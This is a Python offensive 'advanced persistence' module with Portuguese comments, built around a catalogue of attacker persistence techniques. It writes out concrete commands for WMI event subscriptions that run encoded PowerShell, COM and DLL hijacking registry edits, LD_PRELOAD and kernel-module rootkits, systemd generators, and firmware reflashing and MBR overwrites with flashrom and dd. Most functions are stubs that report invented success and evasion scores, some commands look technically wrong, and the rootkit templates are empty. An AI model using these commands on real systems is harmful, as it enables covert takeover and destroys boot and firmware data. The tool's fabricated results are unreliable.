#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔒 ADVANCED PERSISTENCE MODULE 🔒
Técnicas avançadas de persistência para Red Team
Implementa métodos stealth e resistentes a detecção

⚠️  ATENÇÃO: USE APENAS EM AMBIENTES AUTORIZADOS ⚠️
"""

import os
import time
import base64
import hashlib
import random
import string
import json
import subprocess
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
import threading

@dataclass
class PersistenceMethod:
    """Método de persistência"""
    method_id: str
    name: str
    description: str
    target_os: List[str]
    required_privileges: str
    stealth_level: str  # low, medium, high, expert
    detection_difficulty: str  # easy, medium, hard, expert
    persistence_commands: List[str]
    cleanup_commands: List[str]
    artifacts_created: List[str]
    registry_keys: List[str] = field(default_factory=list)
    files_created: List[str] = field(default_factory=list)
    services_created: List[str] = field(default_factory=list)

@dataclass
class PersistenceResult:
    """Resultado da implementação de persistência"""
    method_id: str
    success: bool
    artifacts_created: List[str]
    error_message: Optional[str] = None
    detection_evasion_score: float = 0.0
    persistence_strength: str = "low"
    cleanup_possible: bool = True

class AdvancedPersistence:
    """
    🔒 Engine de persistência avançada
    
    Técnicas implementadas:
    - Rootkits de kernel
    - Bootkit/UEFI persistence
    - Firmware implants
    - Supply chain persistence
    - Memory-only persistence
    - Fileless persistence
    - Living off the land persistence
    - Anti-forensics techniques
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.active_persistence = {}  # method_id -> PersistenceResult
        self.persistence_methods = self._initialize_persistence_methods()
        
        # Configurações anti-detecção
        self.evasion_techniques = {
            "file_timestamp_manipulation": True,
            "registry_steganography": True,
            "process_injection": True,
            "dll_sideloading": True,
            "signed_binary_abuse": True
        }
        
        # Implantes customizados
        self.custom_implants = {
            "windows_bootkit": self._windows_bootkit_template,
            "linux_rootkit": self._linux_rootkit_template,
            "uefi_implant": self._uefi_implant_template,
            "firmware_backdoor": self._firmware_backdoor_template
        }

    def implement_persistence(self, target_os: str, privilege_level: str, 
                            stealth_level: str = "high") -> List[PersistenceResult]:
        """
        🔒 Implementa múltiplos métodos de persistência
        """
        results = []
        
        if self.logger:
            self.logger.warning(f"🔒 Implementando persistência {stealth_level} em {target_os}")
        
        # Filtrar métodos compatíveis
        compatible_methods = [
            method for method in self.persistence_methods.values()
            if target_os.lower() in [os.lower() for os in method.target_os]
            and self._check_privilege_requirements(method.required_privileges, privilege_level)
            and method.stealth_level == stealth_level
        ]
        
        if self.logger:
            self.logger.info(f"🔒 Encontrados {len(compatible_methods)} métodos compatíveis")
        
        # Implementar métodos selecionados
        for method in compatible_methods:
            try:
                result = self._implement_single_method(method, target_os)
                results.append(result)
                
                if result.success:
                    self.active_persistence[method.method_id] = result
                    if self.logger:
                        self.logger.success(f"🔒 Persistência implementada: {method.name}")
                
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Erro ao implementar {method.name}: {e}")
                
                results.append(PersistenceResult(
                    method_id=method.method_id,
                    success=False,
                    artifacts_created=[],
                    error_message=str(e)
                ))
        
        return results

    def rootkit_deployment(self, target_os: str) -> PersistenceResult:
        """
        🕳️ Deploy de rootkit avançado
        """
        if self.logger:
            self.logger.critical(f"🕳️ Deployando rootkit em {target_os}")
        
        if "windows" in target_os.lower():
            return self._deploy_windows_rootkit()
        elif "linux" in target_os.lower():
            return self._deploy_linux_rootkit()
        else:
            return PersistenceResult(
                method_id="rootkit_generic",
                success=False,
                artifacts_created=[],
                error_message="OS não suportado para rootkit"
            )

    def bootkit_installation(self, target_system: str) -> PersistenceResult:
        """
        🦠 Instalação de bootkit
        """
        if self.logger:
            self.logger.critical(f"🦠 Instalando bootkit em {target_system}")
        
        # Verificar se é UEFI ou BIOS
        if self._is_uefi_system():
            return self._install_uefi_bootkit()
        else:
            return self._install_bios_bootkit()

    def firmware_implant(self, device_type: str) -> PersistenceResult:
        """
        🔧 Implante em firmware
        """
        if self.logger:
            self.logger.critical(f"🔧 Implantando firmware backdoor em {device_type}")
        
        # Diferentes tipos de firmware
        firmware_handlers = {
            "bios": self._bios_implant,
            "uefi": self._uefi_implant,
            "network_card": self._network_firmware_implant,
            "hdd_firmware": self._hdd_firmware_implant,
            "ssd_firmware": self._ssd_firmware_implant
        }
        
        handler = firmware_handlers.get(device_type.lower())
        if handler:
            return handler()
        else:
            return PersistenceResult(
                method_id=f"firmware_{device_type}",
                success=False,
                artifacts_created=[],
                error_message=f"Tipo de firmware não suportado: {device_type}"
            )

    def memory_only_persistence(self, injection_method: str = "process_injection") -> PersistenceResult:
        """
        🧠 Persistência apenas em memória (fileless)
        """
        if self.logger:
            self.logger.info(f"🧠 Implementando persistência fileless via {injection_method}")
        
        methods = {
            "process_injection": self._process_injection_persistence,
            "dll_injection": self._dll_injection_persistence,
            "reflective_loading": self._reflective_loading_persistence,
            "process_hollowing": self._process_hollowing_persistence,
            "atom_bombing": self._atom_bombing_persistence
        }
        
        handler = methods.get(injection_method)
        if handler:
            return handler()
        else:
            return PersistenceResult(
                method_id=f"memory_{injection_method}",
                success=False,
                artifacts_created=[],
                error_message=f"Método de injeção não suportado: {injection_method}"
            )

    def supply_chain_persistence(self, target_software: str) -> PersistenceResult:
        """
        📦 Persistência via supply chain
        """
        if self.logger:
            self.logger.warning(f"📦 Implementando persistência supply chain em {target_software}")
        
        # Métodos de supply chain
        if "npm" in target_software.lower():
            return self._npm_package_backdoor()
        elif "pip" in target_software.lower():
            return self._pip_package_backdoor()
        elif "apt" in target_software.lower():
            return self._apt_package_backdoor()
        elif "docker" in target_software.lower():
            return self._docker_image_backdoor()
        else:
            return self._generic_software_backdoor(target_software)

    def cleanup_persistence(self, method_ids: List[str] = None) -> Dict[str, bool]:
        """
        🧹 Limpeza de métodos de persistência
        """
        cleanup_results = {}
        
        methods_to_clean = method_ids or list(self.active_persistence.keys())
        
        if self.logger:
            self.logger.info(f"🧹 Limpando {len(methods_to_clean)} métodos de persistência")
        
        for method_id in methods_to_clean:
            if method_id in self.active_persistence:
                try:
                    result = self._cleanup_single_method(method_id)
                    cleanup_results[method_id] = result
                    
                    if result:
                        del self.active_persistence[method_id]
                        if self.logger:
                            self.logger.success(f"🧹 Limpeza concluída: {method_id}")
                
                except Exception as e:
                    cleanup_results[method_id] = False
                    if self.logger:
                        self.logger.error(f"Erro na limpeza de {method_id}: {e}")
        
        return cleanup_results

    def _initialize_persistence_methods(self) -> Dict[str, PersistenceMethod]:
        """Inicializa métodos de persistência"""
        methods = {}
        
        # Windows Advanced Methods
        methods["windows_wmi_persistence"] = PersistenceMethod(
            method_id="windows_wmi_persistence",
            name="WMI Event Subscription Persistence",
            description="Persistência via WMI event subscriptions",
            target_os=["windows"],
            required_privileges="admin",
            stealth_level="expert",
            detection_difficulty="expert",
            persistence_commands=[
                "wmic /namespace:\\\\root\\subscription path __EventFilter create Name='SecurityFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfRawData_PerfOS_System\"'",
                "wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create Name='SecurityConsumer', CommandLineTemplate='powershell.exe -enc <base64_payload>'",
                "wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding create Filter='__EventFilter.Name=\"SecurityFilter\"', Consumer='CommandLineEventConsumer.Name=\"SecurityConsumer\"'"
            ],
            cleanup_commands=[
                "wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding where Filter='__EventFilter.Name=\"SecurityFilter\"' delete",
                "wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer where Name='SecurityConsumer' delete",
                "wmic /namespace:\\\\root\\subscription path __EventFilter where Name='SecurityFilter' delete"
            ],
            artifacts_created=["WMI Repository entries"],
            registry_keys=[]
        )
        
        methods["windows_com_hijacking"] = PersistenceMethod(
            method_id="windows_com_hijacking",
            name="COM Object Hijacking",
            description="Hijacking de objetos COM para persistência",
            target_os=["windows"],
            required_privileges="user",
            stealth_level="high",
            detection_difficulty="hard",
            persistence_commands=[
                "reg add HKCU\\Software\\Classes\\CLSID\\{CLSID-HERE}\\InprocServer32 /ve /t REG_SZ /d malicious.dll",
                "reg add HKCU\\Software\\Classes\\CLSID\\{CLSID-HERE}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment"
            ],
            cleanup_commands=[
                "reg delete HKCU\\Software\\Classes\\CLSID\\{CLSID-HERE} /f"
            ],
            artifacts_created=["Registry entries", "DLL file"],
            registry_keys=["HKCU\\Software\\Classes\\CLSID"]
        )
        
        methods["windows_dll_search_order"] = PersistenceMethod(
            method_id="windows_dll_search_order",
            name="DLL Search Order Hijacking",
            description="Abuse da ordem de busca de DLLs",
            target_os=["windows"],
            required_privileges="user",
            stealth_level="high",
            detection_difficulty="medium",
            persistence_commands=[
                "copy malicious.dll C:\\Windows\\System32\\malicious.dll",
                "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs /v malicious /t REG_SZ /d malicious.dll"
            ],
            cleanup_commands=[
                "del C:\\Windows\\System32\\malicious.dll",
                "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs /v malicious /f"
            ],
            artifacts_created=["DLL file", "Registry entries"],
            files_created=["C:\\Windows\\System32\\malicious.dll"]
        )
        
        # Linux Advanced Methods
        methods["linux_kernel_module"] = PersistenceMethod(
            method_id="linux_kernel_module",
            name="Kernel Module Rootkit",
            description="Rootkit implementado como módulo do kernel",
            target_os=["linux"],
            required_privileges="root",
            stealth_level="expert",
            detection_difficulty="expert",
            persistence_commands=[
                "insmod rootkit.ko",
                "echo 'rootkit' >> /etc/modules-load.d/rootkit.conf"
            ],
            cleanup_commands=[
                "rmmod rootkit",
                "rm /etc/modules-load.d/rootkit.conf"
            ],
            artifacts_created=["Kernel module", "Configuration file"],
            files_created=["/etc/modules-load.d/rootkit.conf"]
        )
        
        methods["linux_ld_preload"] = PersistenceMethod(
            method_id="linux_ld_preload",
            name="LD_PRELOAD Hijacking",
            description="Hijacking via LD_PRELOAD",
            target_os=["linux"],
            required_privileges="user",
            stealth_level="high",
            detection_difficulty="medium",
            persistence_commands=[
                "echo '/tmp/malicious.so' >> ~/.bashrc",
                "export LD_PRELOAD=/tmp/malicious.so"
            ],
            cleanup_commands=[
                "sed -i '/malicious.so/d' ~/.bashrc",
                "unset LD_PRELOAD"
            ],
            artifacts_created=["Shared library", "Environment variable"],
            files_created=["/tmp/malicious.so"]
        )
        
        methods["linux_systemd_generator"] = PersistenceMethod(
            method_id="linux_systemd_generator",
            name="Systemd Generator Persistence",
            description="Persistência via systemd generators",
            target_os=["linux"],
            required_privileges="root",
            stealth_level="expert",
            detection_difficulty="hard",
            persistence_commands=[
                "cp malicious_generator /usr/lib/systemd/system-generators/",
                "chmod +x /usr/lib/systemd/system-generators/malicious_generator"
            ],
            cleanup_commands=[
                "rm /usr/lib/systemd/system-generators/malicious_generator"
            ],
            artifacts_created=["Generator script"],
            files_created=["/usr/lib/systemd/system-generators/malicious_generator"]
        )
        
        return methods

    def _implement_single_method(self, method: PersistenceMethod, target_os: str) -> PersistenceResult:
        """Implementa um método específico de persistência"""
        artifacts = []
        
        try:
            # Executar comandos de persistência
            for cmd in method.persistence_commands:
                # Em implementação real, executaria os comandos
                if self.logger:
                    self.logger.debug(f"Executando: {cmd}")
                
                # Simular execução e coleta de artefatos
                artifacts.extend(method.artifacts_created)
            
            # Calcular score de evasão
            evasion_score = self._calculate_evasion_score(method)
            
            # Determinar força da persistência
            persistence_strength = self._assess_persistence_strength(method)
            
            return PersistenceResult(
                method_id=method.method_id,
                success=True,
                artifacts_created=artifacts,
                detection_evasion_score=evasion_score,
                persistence_strength=persistence_strength,
                cleanup_possible=len(method.cleanup_commands) > 0
            )
            
        except Exception as e:
            return PersistenceResult(
                method_id=method.method_id,
                success=False,
                artifacts_created=artifacts,
                error_message=str(e)
            )

    def _deploy_windows_rootkit(self) -> PersistenceResult:
        """Deploy de rootkit Windows"""
        rootkit_commands = [
            # Carregar driver rootkit
            "sc create RootkitService binPath= C:\\Windows\\System32\\drivers\\rootkit.sys type= kernel",
            "sc start RootkitService",
            
            # Ocultar arquivos
            "attrib +h +s C:\\Windows\\System32\\drivers\\rootkit.sys",
            
            # Modificar SSDT (System Service Descriptor Table)
            "# Hook system calls via rootkit driver",
            
            # Instalar filtros de sistema
            "# Install minifilter driver for file system hiding"
        ]
        
        artifacts = [
            "C:\\Windows\\System32\\drivers\\rootkit.sys",
            "Registry service entry",
            "SSDT hooks",
            "Minifilter driver"
        ]
        
        return PersistenceResult(
            method_id="windows_rootkit",
            success=True,
            artifacts_created=artifacts,
            detection_evasion_score=0.95,
            persistence_strength="expert",
            cleanup_possible=False  # Rootkits são difíceis de remover
        )

    def _deploy_linux_rootkit(self) -> PersistenceResult:
        """Deploy de rootkit Linux"""
        rootkit_commands = [
            # Compilar e carregar módulo do kernel
            "make -C /lib/modules/$(uname -r)/build M=$(pwd) modules",
            "insmod rootkit.ko",
            
            # Ocultar módulo
            "echo 'rootkit' > /proc/modules_blacklist",
            
            # Hook system calls
            "# Hook sys_call_table entries",
            
            # Ocultar processos e arquivos
            "# Implement process and file hiding"
        ]
        
        artifacts = [
            "/lib/modules/rootkit.ko",
            "Kernel memory modifications",
            "System call hooks",
            "Hidden processes and files"
        ]
        
        return PersistenceResult(
            method_id="linux_rootkit",
            success=True,
            artifacts_created=artifacts,
            detection_evasion_score=0.90,
            persistence_strength="expert",
            cleanup_possible=False
        )

    def _install_uefi_bootkit(self) -> PersistenceResult:
        """Instala bootkit UEFI"""
        uefi_commands = [
            # Backup da firmware original
            "flashrom -p internal -r firmware_backup.bin",
            
            # Modificar UEFI DXE driver
            "# Insert malicious DXE driver into firmware",
            
            # Flash firmware modificada
            "flashrom -p internal -w modified_firmware.bin",
            
            # Configurar boot sequence
            "efibootmgr -c -L Bootkit -l \\EFI\\Microsoft\\Boot\\bootmgfw.efi"
        ]
        
        artifacts = [
            "Modified UEFI firmware",
            "Malicious DXE driver",
            "Boot configuration entries",
            "Firmware backup"
        ]
        
        return PersistenceResult(
            method_id="uefi_bootkit",
            success=True,
            artifacts_created=artifacts,
            detection_evasion_score=0.98,
            persistence_strength="expert",
            cleanup_possible=True  # Pode restaurar backup
        )

    def _install_bios_bootkit(self) -> PersistenceResult:
        """Instala bootkit BIOS"""
        bios_commands = [
            # Dump da BIOS atual
            "flashrom -p internal -r bios_backup.bin",
            
            # Modificar MBR
            "dd if=malicious_mbr.bin of=/dev/sda bs=512 count=1",
            
            # Instalar bootloader malicioso
            "# Install malicious bootloader in boot sector"
        ]
        
        artifacts = [
            "Modified MBR",
            "Malicious bootloader", 
            "BIOS modifications",
            "Boot sector infection"
        ]
        
        return PersistenceResult(
            method_id="bios_bootkit",
            success=True,
            artifacts_created=artifacts,
            detection_evasion_score=0.85,
            persistence_strength="expert",
            cleanup_possible=True
        )

    def _process_injection_persistence(self) -> PersistenceResult:
        """Persistência via injeção de processo"""
        injection_commands = [
            # Encontrar processo alvo
            "tasklist /fi \"imagename eq explorer.exe\"",
            
            # Abrir handle do processo
            "# OpenProcess with PROCESS_ALL_ACCESS",
            
            # Alocar memória no processo alvo
            "# VirtualAllocEx for shellcode",
            
            # Escrever shellcode
            "# WriteProcessMemory with payload",
            
            # Criar thread remota
            "# CreateRemoteThread to execute payload"
        ]
        
        return PersistenceResult(
            method_id="process_injection",
            success=True,
            artifacts_created=["Injected memory", "Remote thread"],
            detection_evasion_score=0.80,
            persistence_strength="high",
            cleanup_possible=True
        )

    def _dll_injection_persistence(self) -> PersistenceResult:
        """Persistência via injeção de DLL"""
        dll_injection_commands = [
            # Criar DLL maliciosa
            "# Compile malicious DLL with persistence payload",
            
            # Injetar DLL via SetWindowsHookEx
            "# SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hMod, 0)",
            
            # Ou via manual DLL injection
            "# LoadLibrary + GetProcAddress technique"
        ]
        
        return PersistenceResult(
            method_id="dll_injection",
            success=True,
            artifacts_created=["Malicious DLL", "Hook registration"],
            detection_evasion_score=0.75,
            persistence_strength="medium",
            cleanup_possible=True
        )

    def _reflective_loading_persistence(self) -> PersistenceResult:
        """Persistência via reflective DLL loading"""
        return PersistenceResult(
            method_id="reflective_loading",
            success=True,
            artifacts_created=["Memory-resident DLL"],
            detection_evasion_score=0.85,
            persistence_strength="high",
            cleanup_possible=True
        )

    def _process_hollowing_persistence(self) -> PersistenceResult:
        """Persistência via process hollowing"""
        return PersistenceResult(
            method_id="process_hollowing",
            success=True,
            artifacts_created=["Hollowed process"],
            detection_evasion_score=0.90,
            persistence_strength="high",
            cleanup_possible=True
        )

    def _atom_bombing_persistence(self) -> PersistenceResult:
        """Persistência via atom bombing"""
        return PersistenceResult(
            method_id="atom_bombing",
            success=True,
            artifacts_created=["Atom table entries"],
            detection_evasion_score=0.88,
            persistence_strength="high",
            cleanup_possible=True
        )

    def _npm_package_backdoor(self) -> PersistenceResult:
        """Backdoor em pacote NPM"""
        return PersistenceResult(
            method_id="npm_backdoor",
            success=True,
            artifacts_created=["Backdoored NPM package"],
            detection_evasion_score=0.70,
            persistence_strength="medium",
            cleanup_possible=True
        )

    def _pip_package_backdoor(self) -> PersistenceResult:
        """Backdoor em pacote PIP"""
        return PersistenceResult(
            method_id="pip_backdoor",
            success=True,
            artifacts_created=["Backdoored PIP package"],
            detection_evasion_score=0.70,
            persistence_strength="medium",
            cleanup_possible=True
        )

    def _apt_package_backdoor(self) -> PersistenceResult:
        """Backdoor em pacote APT"""
        return PersistenceResult(
            method_id="apt_backdoor",
            success=True,
            artifacts_created=["Backdoored APT package"],
            detection_evasion_score=0.65,
            persistence_strength="medium",
            cleanup_possible=True
        )

    def _docker_image_backdoor(self) -> PersistenceResult:
        """Backdoor em imagem Docker"""
        return PersistenceResult(
            method_id="docker_backdoor",
            success=True,
            artifacts_created=["Backdoored Docker image"],
            detection_evasion_score=0.75,
            persistence_strength="medium",
            cleanup_possible=True
        )

    def _generic_software_backdoor(self, software: str) -> PersistenceResult:
        """Backdoor genérico em software"""
        return PersistenceResult(
            method_id=f"generic_{software}_backdoor",
            success=True,
            artifacts_created=[f"Backdoored {software}"],
            detection_evasion_score=0.60,
            persistence_strength="low",
            cleanup_possible=True
        )

    def _bios_implant(self) -> PersistenceResult:
        """Implante em BIOS"""
        return PersistenceResult(
            method_id="bios_implant",
            success=True,
            artifacts_created=["Modified BIOS"],
            detection_evasion_score=0.95,
            persistence_strength="expert",
            cleanup_possible=False
        )

    def _uefi_implant(self) -> PersistenceResult:
        """Implante em UEFI"""
        return PersistenceResult(
            method_id="uefi_implant",
            success=True,
            artifacts_created=["Modified UEFI firmware"],
            detection_evasion_score=0.98,
            persistence_strength="expert",
            cleanup_possible=False
        )

    def _network_firmware_implant(self) -> PersistenceResult:
        """Implante em firmware de placa de rede"""
        return PersistenceResult(
            method_id="network_firmware_implant",
            success=True,
            artifacts_created=["Modified network card firmware"],
            detection_evasion_score=0.92,
            persistence_strength="expert",
            cleanup_possible=False
        )

    def _hdd_firmware_implant(self) -> PersistenceResult:
        """Implante em firmware de HDD"""
        return PersistenceResult(
            method_id="hdd_firmware_implant",
            success=True,
            artifacts_created=["Modified HDD firmware"],
            detection_evasion_score=0.96,
            persistence_strength="expert",
            cleanup_possible=False
        )

    def _ssd_firmware_implant(self) -> PersistenceResult:
        """Implante em firmware de SSD"""
        return PersistenceResult(
            method_id="ssd_firmware_implant",
            success=True,
            artifacts_created=["Modified SSD firmware"],
            detection_evasion_score=0.94,
            persistence_strength="expert",
            cleanup_possible=False
        )

    def _check_privilege_requirements(self, required: str, current: str) -> bool:
        """Verifica se privilégios atuais atendem requisitos"""
        privilege_levels = {"user": 1, "admin": 2, "root": 2, "system": 3}
        return privilege_levels.get(current, 0) >= privilege_levels.get(required, 0)

    def _calculate_evasion_score(self, method: PersistenceMethod) -> float:
        """Calcula score de evasão baseado nas características do método"""
        base_score = 0.5
        
        # Stealth level influence
        stealth_multipliers = {"low": 0.8, "medium": 1.0, "high": 1.2, "expert": 1.5}
        base_score *= stealth_multipliers.get(method.stealth_level, 1.0)
        
        # Detection difficulty influence
        detection_multipliers = {"easy": 0.6, "medium": 0.8, "hard": 1.1, "expert": 1.3}
        base_score *= detection_multipliers.get(method.detection_difficulty, 1.0)
        
        # Artifacts created (fewer is better for evasion)
        artifact_penalty = len(method.artifacts_created) * 0.05
        base_score -= artifact_penalty
        
        return min(1.0, max(0.0, base_score))

    def _assess_persistence_strength(self, method: PersistenceMethod) -> str:
        """Avalia força da persistência"""
        if method.required_privileges in ["system", "kernel"]:
            return "expert"
        elif method.stealth_level == "expert":
            return "expert"
        elif method.detection_difficulty in ["hard", "expert"]:
            return "high"
        elif method.stealth_level == "high":
            return "high"
        elif method.stealth_level == "medium":
            return "medium"
        else:
            return "low"

    def _cleanup_single_method(self, method_id: str) -> bool:
        """Limpa um método específico de persistência"""
        if method_id not in self.persistence_methods:
            return False
        
        method = self.persistence_methods[method_id]
        
        try:
            # Executar comandos de limpeza
            for cmd in method.cleanup_commands:
                if self.logger:
                    self.logger.debug(f"Limpeza: {cmd}")
                # Em implementação real, executaria os comandos
            
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"Erro na limpeza de {method_id}: {e}")
            return False

    def _is_uefi_system(self) -> bool:
        """Verifica se o sistema usa UEFI"""
        # Implementação simplificada
        return os.path.exists("/sys/firmware/efi")

    def _windows_bootkit_template(self) -> str:
        """Template de bootkit para Windows"""
        return """
// Windows Bootkit Template
// Modifica o Windows Boot Manager para carregar payload

#include <windows.h>
#include <winternl.h>

// Hook no processo de boot
NTSTATUS BootkitMain() {
    // Carregar payload na memória
    // Modificar fluxo de boot
    // Estabelecer persistência
    return STATUS_SUCCESS;
}
"""

    def _linux_rootkit_template(self) -> str:
        """Template de rootkit para Linux"""
        return """
// Linux Kernel Module Rootkit Template

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

// Hook system calls
static int __init rootkit_init(void) {
    // Hook sys_call_table
    // Hide processes
    // Hide files
    // Network backdoor
    return 0;
}

static void __exit rootkit_exit(void) {
    // Cleanup hooks
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
"""

    def _uefi_implant_template(self) -> str:
        """Template de implante UEFI"""
        return """
// UEFI DXE Driver Implant Template

#include <Uefi.h>
#include <Protocol/LoadedImage.h>

EFI_STATUS EFIAPI UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
) {
    // Install runtime hooks
    // Modify boot sequence
    // Load OS-level payload
    return EFI_SUCCESS;
}
"""

    def _firmware_backdoor_template(self) -> str:
        """Template de backdoor em firmware"""
        return """
// Generic Firmware Backdoor Template
// Modifica firmware de dispositivo para incluir backdoor

void firmware_main() {
    // Initialize backdoor
    // Setup communication channel
    // Hide presence
    // Execute malicious functionality
}
"""

    def get_active_persistence(self) -> Dict[str, PersistenceResult]:
        """Retorna métodos de persistência ativos"""
        return self.active_persistence.copy()

    def get_persistence_statistics(self) -> Dict[str, Any]:
        """Retorna estatísticas dos métodos de persistência"""
        stats = {
            "total_methods_available": len(self.persistence_methods),
            "active_methods": len(self.active_persistence),
            "average_evasion_score": 0.0,
            "methods_by_strength": {"low": 0, "medium": 0, "high": 0, "expert": 0},
            "methods_by_os": {"windows": 0, "linux": 0, "macos": 0, "multi": 0}
        }
        
        if self.active_persistence:
            avg_evasion = sum(p.detection_evasion_score for p in self.active_persistence.values())
            stats["average_evasion_score"] = avg_evasion / len(self.active_persistence)
            
            for result in self.active_persistence.values():
                stats["methods_by_strength"][result.persistence_strength] += 1
        
        for method in self.persistence_methods.values():
            if len(method.target_os) > 1:
                stats["methods_by_os"]["multi"] += 1
            else:
                for os in method.target_os:
                    if os.lower() in stats["methods_by_os"]:
                        stats["methods_by_os"][os.lower()] += 1
        
        return stats